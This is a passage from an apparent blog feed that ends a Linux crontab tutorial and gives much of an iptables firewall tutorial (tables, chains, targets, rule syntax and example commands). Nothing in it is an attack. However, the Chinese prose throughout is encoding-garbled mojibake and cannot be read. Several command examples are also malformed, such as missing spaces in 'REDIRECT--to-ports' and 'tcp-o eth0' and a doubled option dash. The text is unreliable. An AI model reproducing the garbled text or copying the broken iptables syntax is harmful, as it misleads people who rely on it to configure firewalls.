0ï¼šæ˜ŸæœŸæ—¥ï¼Œ1ï¼šæ˜ŸæœŸä¸€ï¼Œâ€¦)</td></tr><tr><td>Command</td><td>å®Œæ•´çš„å¯æ‰§è¡Œå‘½ä»¤ï¼ˆç»å¯¹è·¯å¾„ï¼‰</td></tr></tbody></table><p>æ‚¨è¿˜å¯ä»¥åœ¨ä»»ä½•è¿™äº›å­—æ®µä¸­ä½¿ç”¨æ˜Ÿå· (<strong>*</strong>) å°†å…¶è®¾ç½®ä¸ºâ€œä»å¤´åˆ°å°¾â€ã€‚æ‰€ä»¥å¦‚æœ day å­—æ®µè®¾ç½®ä¸º<strong>*<strong>ï¼Œåˆ™è¯¥å‘½ä»¤å°†æ¯å¤©æ‰§è¡Œã€‚æ‚¨è¿˜å¯ä»¥å€ŸåŠ©é€—å· (</strong>,</strong>) åœ¨ä¸€ä¸ªå­—æ®µä¸­æ·»åŠ å¤šä¸ªæ¡ä»¶ã€‚æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ç ´æŠ˜å· (<strong>-</strong>) ç¬¦å·æ”¾ç½®ä¸€ç³»åˆ—å€¼ã€‚<br>ç°åœ¨çœ‹ç¬¬ä¸€ä¸ªä¾‹å­ï¼Œè¿™é‡Œæˆ‘å®‰æ’äº†æ¯å‘¨ä¸€ 12:00 æ‰§è¡Œçš„ä»»åŠ¡ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">0 12 * * 1 <span class="token function">touch</span> /home/truda/file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç°åœ¨è®©æˆ‘ä»¬å†ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œæˆ‘æƒ³åœ¨æ¯ä¸ªæœˆçš„ç¬¬ 5ã€10 å’Œ 15 å¤©çš„ 16:30 æ‰§è¡Œä¸€æ¬¡ä»»åŠ¡ï¼Œæˆ‘ä¼šè¾“å…¥ä»¥ä¸‹å†…å®¹ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">30 16 5,10,15 * * /bin/sh /home/truda/task.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œæˆ‘åœ¨æ¯æœˆçš„æ¯ 1-5 å¤©çš„ 12:30 æ‰§è¡Œä»»åŠ¡ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">30 12 1-5 * * <span class="token function">touch</span> /home/truda/NewFile.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="å››ã€å¦‚ä½•åˆ é™¤-crontab-ä»»åŠ¡ï¼Ÿ"><a href="#å››ã€å¦‚ä½•åˆ é™¤-crontab-ä»»åŠ¡ï¼Ÿ" class="headerlink" title="å››ã€å¦‚ä½•åˆ é™¤ crontab ä»»åŠ¡ï¼Ÿ"></a>å››ã€å¦‚ä½•åˆ é™¤ crontab ä»»åŠ¡ï¼Ÿ</h2><p>é¦–å…ˆè¦æŸ¥çœ‹ç°æœ‰çš„ crontab ä»»åŠ¡ï¼Œæ‚¨å¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">crontab</span> -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¦æ¸…é™¤æ‰€æœ‰ crontab ä»»åŠ¡ï¼Œæ‚¨å¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">crontab</span> -r<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="äº”ã€å¦‚ä½•æ›´æ”¹å…¶ä»–ç”¨æˆ·çš„-crontab-ä»»åŠ¡ï¼Ÿ"><a href="#äº”ã€å¦‚ä½•æ›´æ”¹å…¶ä»–ç”¨æˆ·çš„-crontab-ä»»åŠ¡ï¼Ÿ" class="headerlink" title="äº”ã€å¦‚ä½•æ›´æ”¹å…¶ä»–ç”¨æˆ·çš„ crontab ä»»åŠ¡ï¼Ÿ"></a>äº”ã€å¦‚ä½•æ›´æ”¹å…¶ä»–ç”¨æˆ·çš„ crontab ä»»åŠ¡ï¼Ÿ</h2><p>å¦‚æœæ‚¨æ˜¯ rootï¼Œæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨è¯¥ -u é€‰é¡¹æ›´æ”¹å…¶ä»–ç”¨æˆ·çš„ crontab ä»»åŠ¡ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨å¸Œæœ›ä»¥ root èº«ä»½ä¸ºç”¨æˆ·â€œtrudaâ€ç¼–è¾‘ cron æ–‡ä»¶ï¼Œæ‚¨å°†è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">crontab</span> -u truda -e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iptablesé˜²ç«å¢™çš„ä½¿ç”¨</title>
      <link href="/post/84b6e48c.html"/>
      <url>/post/84b6e48c.html</url>
      
        <content type="html"><![CDATA[<h1 id="iptables-é˜²ç«å¢™çš„ä½¿ç”¨"><a href="#iptables-é˜²ç«å¢™çš„ä½¿ç”¨" class="headerlink" title="iptables é˜²ç«å¢™çš„ä½¿ç”¨"></a>iptables é˜²ç«å¢™çš„ä½¿ç”¨</h1><h2 id="ä¸€ã€ç®€ä»‹"><a href="#ä¸€ã€ç®€ä»‹" class="headerlink" title="ä¸€ã€ç®€ä»‹"></a>ä¸€ã€ç®€ä»‹</h2><p>iptables æ˜¯ä¸€ä¸ªé…ç½® Linux å†…æ ¸é˜²ç«å¢™çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œå®ƒåŸºäºå†…æ ¸çš„ netfilter æœºåˆ¶ã€‚iptables å¯ä»¥æ£€æµ‹ã€ä¿®æ”¹ã€è½¬å‘ã€é‡å®šå‘å’Œä¸¢å¼ƒ IPv4 æ•°æ®åŒ…ã€‚</p><h3 id="netfilter"><a href="#netfilter" class="headerlink" title="netfilter"></a>netfilter</h3><p>netfilter æ˜¯ Linux å†…æ ¸çš„åŒ…è¿‡æ»¤æ¡†æ¶ï¼Œå®ƒæä¾›äº†ä¸€ç³»åˆ—çš„é’©å­ï¼ˆHookï¼‰ä¾›å…¶ä»–æ¨¡å—æ§åˆ¶åŒ…çš„æµåŠ¨ã€‚è¿™äº›é’©å­åŒ…æ‹¬ï¼š</p><ul><li>NF_IP_PRE_ROUTINGï¼šåˆšåˆšé€šè¿‡æ•°æ®é“¾è·¯å±‚è§£åŒ…è¿›å…¥ç½‘ç»œå±‚çš„æ•°æ®åŒ…é€šè¿‡æ­¤é’©å­ï¼Œå®ƒåœ¨è·¯ç”±ä¹‹å‰å¤„ç†</li><li>NF_IP_LOCAL_INï¼šç»è¿‡è·¯ç”±æŸ¥æ‰¾åï¼Œé€å¾€æœ¬æœºï¼ˆç›®çš„åœ°å€åœ¨æœ¬åœ°ï¼‰çš„åŒ…ä¼šé€šè¿‡æ­¤é’©å­</li><li>NF_IP_FORWARDï¼šä¸æ˜¯æœ¬åœ°äº§ç”Ÿçš„å¹¶ä¸”ç›®çš„åœ°ä¸æ˜¯æœ¬åœ°çš„åŒ…ï¼ˆå³è½¬å‘çš„åŒ…ï¼‰ä¼šé€šè¿‡æ­¤é’©å­</li><li>NF_IP_LOCAL_OUTï¼šæ‰€æœ‰æœ¬åœ°ç”Ÿæˆçš„å‘å¾€å…¶ä»–æœºå™¨çš„åŒ…ä¼šé€šè¿‡è¯¥é’©å­</li><li>NF_IP_POST_ROUTINGï¼šåœ¨åŒ…å°±è¦ç¦»å¼€æœ¬æœºä¹‹å‰ä¼šé€šè¿‡è¯¥é’©å­ï¼Œå®ƒåœ¨è·¯ç”±ä¹‹åå¤„ç†</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627832131711-020d0d26-cdb4-4fac-b4ea-c40c77ee9821.png#clientId=u29e6ff67-2d10-4&amp;from=paste&amp;id=uee486ae6&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=433&amp;originWidth=1429&amp;originalType=url%E2%88%B6=1&amp;size=354351&amp;status=done&amp;style=none&amp;taskId=u8b62e0a3-e9cf-4460-9db8-57d321e5a9d" alt="image.png"></p><h2 id="äºŒã€åŸç†"><a href="#äºŒã€åŸç†" class="headerlink" title="äºŒã€åŸç†"></a>äºŒã€åŸç†</h2><h3 id="è¡¨ï¼ˆTablesï¼‰"><a href="#è¡¨ï¼ˆTablesï¼‰" class="headerlink" title="è¡¨ï¼ˆTablesï¼‰"></a>è¡¨ï¼ˆTablesï¼‰</h3><p>è§£é‡Šï¼šç›¸åŒè§„åˆ™çš„é›†åˆå«åš <strong>è¡¨ï¼ˆTablesï¼‰</strong><br><strong>â€‹</strong></p><p><strong>iptables</strong>åŒ…å« 5 å¼ è¡¨ï¼ˆtablesï¼‰ï¼š</p><ol><li>raw ç”¨äºé…ç½®æ•°æ®åŒ…ï¼Œraw ä¸­çš„æ•°æ®åŒ…ä¸ä¼šè¢«ç³»ç»Ÿè·Ÿè¸ªã€‚</li><li>filter æ˜¯ç”¨äºå­˜æ”¾æ‰€æœ‰ä¸é˜²ç«å¢™ç›¸å…³æ“ä½œçš„é»˜è®¤è¡¨ã€‚</li><li>nat ç”¨äº <a href="https://en.wikipedia.org/wiki/Network_address_translation">ç½‘ç»œåœ°å€è½¬æ¢</a>ï¼ˆä¾‹å¦‚ï¼šç«¯å£è½¬å‘ï¼‰ã€‚</li><li>mangle ç”¨äºå¯¹ç‰¹å®šæ•°æ®åŒ…çš„ä¿®æ”¹ï¼ˆå‚è€ƒ <a href="https://en.wikipedia.org/wiki/Mangled_packet">æŸåæ•°æ®åŒ…</a>ï¼‰ã€‚</li><li>security ç”¨äº <a href="https://wiki.archlinux.org/title/Security#Mandatory_access_control">å¼ºåˆ¶è®¿é—®æ§åˆ¶</a> ç½‘ç»œè§„åˆ™</li></ol><p>å¤§éƒ¨åˆ†æƒ…å†µä»…éœ€è¦ä½¿ç”¨<strong>filter</strong>å’Œ<strong>nat</strong>ã€‚<br>â€‹</p><h3 id="é“¾-ï¼ˆChainsï¼‰"><a href="#é“¾-ï¼ˆChainsï¼‰" class="headerlink" title="é“¾ ï¼ˆChainsï¼‰"></a>é“¾ ï¼ˆChainsï¼‰</h3><p>è¡¨ç”±é“¾ç»„æˆï¼Œé“¾æ˜¯ä¸€äº›æŒ‰é¡ºåºæ’åˆ—çš„è§„åˆ™çš„åˆ—è¡¨ã€‚é»˜è®¤çš„ filter è¡¨åŒ…å« INPUTï¼Œ OUTPUT å’Œ FORWARD 3 æ¡å†…å»ºçš„é“¾ï¼Œè¿™ 3 æ¡é“¾ä½œç”¨äºæ•°æ®åŒ…è¿‡æ»¤è¿‡ç¨‹ä¸­çš„ä¸åŒæ—¶é—´ç‚¹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚nat è¡¨åŒ…å« PREROUTINGï¼Œ POSTROUTING å’Œ OUTPUT é“¾ã€‚<br>ä½¿ç”¨ <a href="https://man.archlinux.org/man/iptables.8">iptables(8)</a> æŸ¥çœ‹å…¶ä»–è¡¨ä¸­å†…å»ºé“¾çš„æè¿°ã€‚<br>é»˜è®¤æƒ…å†µä¸‹ï¼Œä»»ä½•é“¾ä¸­éƒ½æ²¡æœ‰è§„åˆ™ã€‚å¯ä»¥å‘é“¾ä¸­æ·»åŠ è‡ªå·±æƒ³ç”¨çš„è§„åˆ™ã€‚é“¾çš„é»˜è®¤è§„åˆ™é€šå¸¸è®¾ç½®ä¸º ACCEPTï¼Œå¦‚æœæƒ³ç¡®ä¿ä»»ä½•åŒ…éƒ½ä¸èƒ½é€šè¿‡è§„åˆ™é›†ï¼Œé‚£ä¹ˆå¯ä»¥é‡ç½®ä¸º DROPã€‚é»˜è®¤çš„è§„åˆ™æ€»æ˜¯åœ¨ä¸€æ¡é“¾çš„æœ€åç”Ÿæ•ˆï¼Œæ‰€ä»¥åœ¨é»˜è®¤è§„åˆ™ç”Ÿæ•ˆå‰æ•°æ®åŒ…éœ€è¦é€šè¿‡æ‰€æœ‰å­˜åœ¨çš„è§„åˆ™ã€‚<br>ç”¨æˆ·å¯ä»¥åŠ å…¥è‡ªå·±å®šä¹‰çš„é“¾ï¼Œä»è€Œä½¿è§„åˆ™é›†æ›´æœ‰æ•ˆå¹¶ä¸”æ˜“äºä¿®æ”¹ã€‚<br>â€‹</p><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/519483/1627833570108-3b737d12-a591-4451-a30e-c803245e9869.jpeg#clientId=u29e6ff67-2d10-4&amp;from=paste&amp;id=u042970d9&amp;margin=%5Bobject%20Object%5D&amp;originHeight=1100&amp;originWidth=647&amp;originalType=url%E2%88%B6=1&amp;status=done&amp;style=none&amp;taskId=ubaa1e532-3b21-4845-a0bb-d66f7644ebf"></p><h3 id="è§„åˆ™-ï¼ˆRulesï¼‰"><a href="#è§„åˆ™-ï¼ˆRulesï¼‰" class="headerlink" title="è§„åˆ™ ï¼ˆRulesï¼‰"></a>è§„åˆ™ ï¼ˆRulesï¼‰</h3><p>æ ¹æ®æŒ‡å®šçš„åŒ¹é…æ¡ä»¶æ¥å°è¯•åŒ¹é…æ¯ä¸ªæµç»æ­¤å¤„çš„æŠ¥æ–‡ï¼ŒåŒ¹é…æˆåŠŸï¼Œåˆ™ç”±è§„åˆ™æŒ‡å®šçš„åŠ¨ä½œæ¥å¤„ç†ã€‚<br>â€‹</p><h4 id="åŒ¹é…æ¡ä»¶"><a href="#åŒ¹é…æ¡ä»¶" class="headerlink" title="åŒ¹é…æ¡ä»¶"></a>åŒ¹é…æ¡ä»¶</h4><ul><li>åŸºæœ¬åŒ¹é…æ¡ä»¶</li><li>æ‹“å±•åŒ¹é…æ¡ä»¶</li></ul><p>â€‹</p><h4 id="å¤„ç†åŠ¨ä½œ"><a href="#å¤„ç†åŠ¨ä½œ" class="headerlink" title="å¤„ç†åŠ¨ä½œ"></a>å¤„ç†åŠ¨ä½œ</h4><ul><li>ACCEPTï¼šå…è®¸æ•°æ®åŒ…é€šè¿‡ã€‚</li><li>DROPï¼šç›´æ¥ä¸¢å¼ƒæ•°æ®åŒ…ï¼Œä¸ç»™ä»»ä½•å›åº”ä¿¡æ¯ï¼Œè¿™æ—¶å€™å®¢æˆ·ç«¯ä¼šæ„Ÿè§‰è‡ªå·±çš„è¯·æ±‚æ³¥ç‰›å…¥æµ·äº†ï¼Œè¿‡äº†è¶…æ—¶æ—¶é—´æ‰ä¼šæœ‰ååº”ã€‚</li><li>REJECTï¼šæ‹’ç»æ•°æ®åŒ…é€šè¿‡ï¼Œå¿…è¦æ—¶ä¼šç»™æ•°æ®å‘é€ç«¯ä¸€ä¸ªå“åº”çš„ä¿¡æ¯ï¼Œå®¢æˆ·ç«¯åˆšè¯·æ±‚å°±ä¼šæ”¶åˆ°æ‹’ç»çš„ä¿¡æ¯ã€‚</li><li>SNATï¼šæºåœ°å€è½¬æ¢ï¼Œè§£å†³å†…ç½‘ç”¨æˆ·ç”¨åŒä¸€ä¸ªå…¬ç½‘åœ°å€ä¸Šç½‘çš„é—®é¢˜ã€‚</li><li>MASQUERADEï¼šæ˜¯ SNAT çš„ä¸€ç§ç‰¹æ®Šå½¢å¼ï¼Œé€‚ç”¨äºåŠ¨æ€çš„ã€ä¸´æ—¶ä¼šå˜çš„ ip ä¸Šã€‚</li><li>DNATï¼šç›®æ ‡åœ°å€è½¬æ¢ã€‚</li><li>REDIRECTï¼šåœ¨æœ¬æœºåšç«¯å£æ˜ å°„ã€‚</li><li>LOGï¼šåœ¨/var/log/messages æ–‡ä»¶ä¸­è®°å½•æ—¥å¿—ä¿¡æ¯ï¼Œç„¶åå°†æ•°æ®åŒ…ä¼ é€’ç»™ä¸‹ä¸€æ¡è§„åˆ™ï¼Œä¹Ÿå°±æ˜¯è¯´é™¤äº†è®°å½•ä»¥å¤–ä¸å¯¹æ•°æ®åŒ…åšä»»ä½•å…¶ä»–æ“ä½œï¼Œä»ç„¶è®©ä¸‹ä¸€æ¡è§„åˆ™å»åŒ¹é…ã€‚</li><li>RETURNï¼šé˜²åœæ­¢æ‰§è¡Œå½“å‰é“¾çš„åç»­ rulesï¼Œå¹¶è¿”å›åˆ°è°ƒç”¨é“¾ä¸­</li></ul><p><img src="https://github.com/javahuang/gitbook/raw/88b98c792e1d597dca5d7b93e4f20d31ea7ad5af/linux/media/021217_0051_6.png#from=url&amp;id=bJrQo&amp;margin=%5Bobject%20Object%5D&amp;originHeight=533&amp;originWidth=1012&amp;originalType=binary%E2%88%B6=1&amp;status=done&amp;style=none"><br>å›¾ä¸­å¯ä»¥çœ‹åˆ°å¦‚ä¸‹</p><ul><li>æœ‰å“ªäº›ç±»å‹çš„è¡¨ï¼Œ<strong>é»„è‰²çš„è¡¨ç¤ºè¡¨</strong></li><li>æœ‰å“ªäº›ç±»å‹çš„é“¾ï¼Œ<strong>çº¢è‰²çš„è¡¨ç¤ºé“¾</strong></li><li>é“¾çš„è§„åˆ™å¯ä»¥å­˜æ”¾åœ¨å“ªäº›è¡¨ä¸­</li><li>è¡¨çš„è§„åˆ™å¯ä»¥åº”ç”¨åˆ°å“ªäº›é“¾ä¸­</li><li>é“¾ä¸­è¡¨çš„æ‰§è¡Œä¼˜å…ˆçº§</li></ul><p>â€‹</p><h2 id="ä¸‰ã€è¯­æ³•"><a href="#ä¸‰ã€è¯­æ³•" class="headerlink" title="ä¸‰ã€è¯­æ³•"></a>ä¸‰ã€è¯­æ³•</h2><h3 id="iptables-å‘½ä»¤çš„ä¸€èˆ¬æ ¼å¼"><a href="#iptables-å‘½ä»¤çš„ä¸€èˆ¬æ ¼å¼" class="headerlink" title="iptables å‘½ä»¤çš„ä¸€èˆ¬æ ¼å¼"></a>iptables å‘½ä»¤çš„ä¸€èˆ¬æ ¼å¼</h3><pre class="line-numbers language-bash"><code class="language-bash">iptables <span class="token punctuation">[</span>-t è¡¨<span class="token punctuation">]</span> -å‘½ä»¤ åŒ¹é… æ“ä½œ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="t-è¡¨"><a href="#t-è¡¨" class="headerlink" title="-t è¡¨"></a>-t è¡¨</h3><p>è¡¨é€‰é¡¹ç”¨äºæŒ‡å®šå‘½ä»¤åº”ç”¨äºå“ªä¸ª iptables å†…ç½®è¡¨ã€‚<br>â€‹</p><h3 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h3><p>å‘½ä»¤é€‰é¡¹ç”¨äºæŒ‡å®š iptables çš„æ‰§è¡Œæ–¹å¼ï¼ŒåŒ…æ‹¬æ’å…¥è§„åˆ™ï¼Œåˆ é™¤è§„åˆ™å’Œæ·»åŠ è§„åˆ™ï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤º</p><pre class="line-numbers language-bash"><code class="language-bash">-P  --policy        <span class="token operator">&lt;</span>é“¾å<span class="token operator">></span>  å®šä¹‰é»˜è®¤ç­–ç•¥-L  --list          <span class="token operator">&lt;</span>é“¾å<span class="token operator">></span>  æŸ¥çœ‹iptablesè§„åˆ™åˆ—è¡¨-A  --append        <span class="token operator">&lt;</span>é“¾å<span class="token operator">></span>  åœ¨è§„åˆ™åˆ—è¡¨çš„æœ€åå¢åŠ 1æ¡è§„åˆ™-I  --insert        <span class="token operator">&lt;</span>é“¾å<span class="token operator">></span>  åœ¨æŒ‡å®šçš„ä½ç½®æ’å…¥1æ¡è§„åˆ™-D  --delete        <span class="token operator">&lt;</span>é“¾å<span class="token operator">></span>  ä»è§„åˆ™åˆ—è¡¨ä¸­åˆ é™¤1æ¡è§„åˆ™-R  --replace       <span class="token operator">&lt;</span>é“¾å<span class="token operator">></span>  æ›¿æ¢è§„åˆ™åˆ—è¡¨ä¸­çš„æŸæ¡è§„åˆ™-F  --flush         <span class="token operator">&lt;</span>é“¾å<span class="token operator">></span>  åˆ é™¤è¡¨ä¸­æ‰€æœ‰è§„åˆ™-Z  --zero          <span class="token operator">&lt;</span>é“¾å<span class="token operator">></span>  å°†è¡¨ä¸­æ•°æ®åŒ…è®¡æ•°å™¨å’Œæµé‡è®¡æ•°å™¨å½’é›¶-X  --delete-chain  <span class="token operator">&lt;</span>é“¾å<span class="token operator">></span>  åˆ é™¤è‡ªå®šä¹‰é“¾-v  --verbose       <span class="token operator">&lt;</span>é“¾å<span class="token operator">></span>  ä¸-Lä»–å‘½ä»¤ä¸€èµ·ä½¿ç”¨æ˜¾ç¤ºæ›´å¤šæ›´è¯¦ç»†çš„ä¿¡æ¯<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="åŒ¹é…è§„åˆ™"><a href="#åŒ¹é…è§„åˆ™" class="headerlink" title="åŒ¹é…è§„åˆ™"></a>åŒ¹é…è§„åˆ™</h3><p>åŒ¹é…é€‰é¡¹æŒ‡å®šæ•°æ®åŒ…ä¸è§„åˆ™åŒ¹é…æ‰€å…·æœ‰çš„ç‰¹å¾ï¼ŒåŒ…æ‹¬æºåœ°å€ï¼Œç›®çš„åœ°å€ï¼Œä¼ è¾“åè®®å’Œç«¯å£å·ï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤º</p><pre class="line-numbers language-bash"><code class="language-bash">-i --in-interface    ç½‘ç»œæ¥å£å<span class="token operator">></span>     æŒ‡å®šæ•°æ®åŒ…ä»å“ªä¸ªç½‘ç»œæ¥å£è¿›å…¥ï¼Œ-o --out-interface   ç½‘ç»œæ¥å£å<span class="token operator">></span>     æŒ‡å®šæ•°æ®åŒ…ä»å“ªä¸ªç½‘ç»œæ¥å£è¾“å‡º-p ---proto          åè®®ç±»å‹        æŒ‡å®šæ•°æ®åŒ…åŒ¹é…çš„åè®®ï¼Œå¦‚TCPã€UDPå’ŒICMPç­‰-s --source          æºåœ°å€æˆ–å­ç½‘<span class="token operator">></span>   æŒ‡å®šæ•°æ®åŒ…åŒ¹é…çš„æºåœ°å€   --sport           æºç«¯å£å·<span class="token operator">></span>       æŒ‡å®šæ•°æ®åŒ…åŒ¹é…çš„æºç«¯å£å·   --dport           ç›®çš„ç«¯å£å·<span class="token operator">></span>     æŒ‡å®šæ•°æ®åŒ…åŒ¹é…çš„ç›®çš„ç«¯å£å·-m --match           åŒ¹é…çš„æ¨¡å—      æŒ‡å®šæ•°æ®åŒ…è§„åˆ™æ‰€ä½¿ç”¨çš„è¿‡æ»¤æ¨¡å—<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="åŠ¨ä½œ"><a href="#åŠ¨ä½œ" class="headerlink" title="åŠ¨ä½œ"></a>åŠ¨ä½œ</h3><p>å‰é¢æˆ‘ä»¬è¯´è¿‡ iptables å¤„ç†åŠ¨ä½œé™¤äº† ACCEPTã€REJECTã€DROPã€REDIRECT ã€MASQUERADE ä»¥å¤–ï¼Œè¿˜å¤šå‡º LOGã€ULOGã€DNATã€RETURNã€TOSã€SNATã€MIRRORã€QUEUEã€TTLã€MARK ç­‰ã€‚æˆ‘ä»¬åªè¯´æ˜å…¶ä¸­æœ€å¸¸ç”¨çš„åŠ¨ä½œï¼š</p><ul><li>REJECT æ‹¦é˜»è¯¥æ•°æ®åŒ…ï¼Œå¹¶è¿”å›æ•°æ®åŒ…é€šçŸ¥å¯¹æ–¹ï¼Œå¯ä»¥è¿”å›çš„æ•°æ®åŒ…æœ‰å‡ ä¸ªé€‰æ‹©ï¼šICMP port-unreachableã€ICMP echo-reply æˆ–æ˜¯ tcp-resetï¼ˆè¿™ä¸ªæ•°æ®åŒ…åŒ…ä¼šè¦æ±‚å¯¹æ–¹å…³é—­è”æœºï¼‰ï¼Œè¿›è¡Œå®Œæ­¤å¤„ç†åŠ¨ä½œåï¼Œå°†ä¸å†æ¯”å¯¹å…¶å®ƒè§„åˆ™ï¼Œç›´æ¥ä¸­æ–­è¿‡æ»¤ç¨‹åºã€‚èŒƒä¾‹å¦‚ä¸‹ï¼š</li></ul><pre class="line-numbers language-bash"><code class="language-bash">iptables -A  INPUT -p TCP --dport 22 -j REJECT --reject-with ICMP echo-reply<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>DROP ä¸¢å¼ƒæ•°æ®åŒ…ä¸äºˆå¤„ç†ï¼Œè¿›è¡Œå®Œæ­¤å¤„ç†åŠ¨ä½œåï¼Œå°†ä¸å†æ¯”å¯¹å…¶å®ƒè§„åˆ™ï¼Œç›´æ¥ä¸­æ–­è¿‡æ»¤ç¨‹åºã€‚</li><li>REDIRECT å°†å°åŒ…é‡æ–°å¯¼å‘åˆ°å¦ä¸€ä¸ªç«¯å£ï¼ˆPNATï¼‰ï¼Œè¿›è¡Œå®Œæ­¤å¤„ç†åŠ¨ä½œåï¼Œå°†ä¼šç»§ç»­æ¯”å¯¹å…¶å®ƒè§„åˆ™ã€‚è¿™ä¸ªåŠŸèƒ½å¯ä»¥ç”¨æ¥å®ä½œé€æ˜ä»£ç† æˆ–ç”¨æ¥ä¿æŠ¤ web æœåŠ¡å™¨ã€‚ä¾‹å¦‚ï¼š</li></ul><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT--to-ports 8081<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>MASQUERADE æ”¹å†™å°åŒ…æ¥æº IP ä¸ºé˜²ç«å¢™çš„ IPï¼Œå¯ä»¥æŒ‡å®š port å¯¹åº”çš„èŒƒå›´ï¼Œè¿›è¡Œå®Œæ­¤å¤„ç†åŠ¨ä½œåï¼Œç›´æ¥è·³å¾€ä¸‹ä¸€ä¸ªè§„åˆ™é“¾ï¼ˆmangle:postroutingï¼‰ã€‚è¿™ä¸ªåŠŸèƒ½ä¸ SNAT ç•¥æœ‰ä¸åŒï¼Œå½“è¿›è¡Œ IP ä¼ªè£…æ—¶ï¼Œä¸éœ€æŒ‡å®šè¦ä¼ªè£…æˆå“ªä¸ª IPï¼ŒIP ä¼šä»ç½‘å¡ç›´æ¥è¯»å–ï¼Œå½“ä½¿ç”¨æ‹¨æ¥è¿çº¿æ—¶ï¼ŒIP é€šå¸¸æ˜¯ç”± ISP å…¬å¸çš„ DHCP æœåŠ¡å™¨æŒ‡æ´¾çš„ï¼Œè¿™ä¸ªæ—¶å€™ MASQUERADE ç‰¹åˆ«æœ‰ç”¨ã€‚èŒƒä¾‹å¦‚ä¸‹ï¼š</li></ul><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A POSTROUTING -p TCP -j MASQUERADE --to-ports 21000-31000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>LOG å°†æ•°æ®åŒ…ç›¸å…³ä¿¡æ¯çºªå½•åœ¨ /var/log ä¸­ï¼Œè¯¦ç»†ä½ç½®è¯·æŸ¥é˜… /etc/syslog.conf é…ç½®æ–‡ä»¶ï¼Œè¿›è¡Œå®Œæ­¤å¤„ç†åŠ¨ä½œåï¼Œå°†ä¼šç»§ç»­æ¯”å¯¹å…¶å®ƒè§„åˆ™ã€‚ä¾‹å¦‚ï¼š</li></ul><pre class="line-numbers language-bash"><code class="language-bash">iptables -A INPUT -p tcp -j LOG --log-prefix <span class="token string">"input packet"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>SNAT æ”¹å†™å°åŒ…æ¥æº IP ä¸ºæŸç‰¹å®š IP æˆ– IP èŒƒå›´ï¼Œå¯ä»¥æŒ‡å®š port å¯¹åº”çš„èŒƒå›´ï¼Œè¿›è¡Œå®Œæ­¤å¤„ç†åŠ¨ä½œåï¼Œå°†ç›´æ¥è·³å¾€ä¸‹ä¸€ä¸ªè§„åˆ™ç‚¼ï¼ˆmangle:postroutingï¼‰ã€‚èŒƒä¾‹å¦‚ä¸‹ï¼š</li></ul><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A POSTROUTING -p tcp-o eth0 -j SNAT --to-source 192.168.10.15-192.168.10.160:2100-3200<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>DNAT æ”¹å†™æ•°æ®åŒ…åŒ…ç›®çš„åœ° IP ä¸ºæŸç‰¹å®š IP æˆ– IP èŒƒå›´ï¼Œå¯ä»¥æŒ‡å®š port å¯¹åº”çš„èŒƒå›´ï¼Œè¿›è¡Œå®Œæ­¤å¤„ç†åŠ¨ä½œåï¼Œå°†ä¼šç›´æ¥è·³å¾€ä¸‹ä¸€ä¸ªè§„åˆ™é“¾ï¼ˆfilter:input æˆ– filter:forwardï¼‰ã€‚èŒƒä¾‹å¦‚ä¸‹ï¼š</li></ul><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A PREROUTING -p tcp -d 15.45.23.67 --dport 80 -j DNAT --to-destination 192.168.10.1-192.168.10.10:80-100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>MIRROR é•œåƒæ•°æ®åŒ…ï¼Œä¹Ÿå°±æ˜¯å°†æ¥æº IP ä¸ç›®çš„åœ° IP å¯¹è°ƒåï¼Œå°†æ•°æ®åŒ…è¿”å›ï¼Œè¿›è¡Œå®Œæ­¤å¤„ç†åŠ¨ä½œåï¼Œå°†ä¼šä¸­æ–­è¿‡æ»¤ç¨‹åºã€‚</li><li>QUEUE 